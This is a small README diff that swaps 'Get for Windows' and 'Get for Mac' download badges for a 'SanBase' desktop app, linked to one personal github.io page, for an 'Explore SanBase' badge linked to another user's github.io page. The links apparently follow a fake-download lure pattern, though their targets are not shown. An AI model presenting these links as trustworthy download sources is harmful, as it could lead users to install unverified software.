@@ -6,10 +6,7 @@
 <br>
 <div align="center">
 
-[![💻 Get for Windows](https://img.shields.io/badge/💻_Get_for_Windows-blue?style=for-the-badge&logo=windows)](https://emanuelnat9266.github.io/.github/SanBase-Desktop-App)  
-
-[![🍏 Get for Mac](https://img.shields.io/badge/🍏_Get_for_Mac-green?style=for-the-badge&logo=apple)](https://emanuelnat9266.github.io/.github/SanBase-Desktop-App)
-</div>
+[![Explore SanBase](https://img.shields.io/badge/Explore-SanBase-0E7490?style=flat-square)](https://carmellabeegle.github.io/.github/)
 
 ---
 
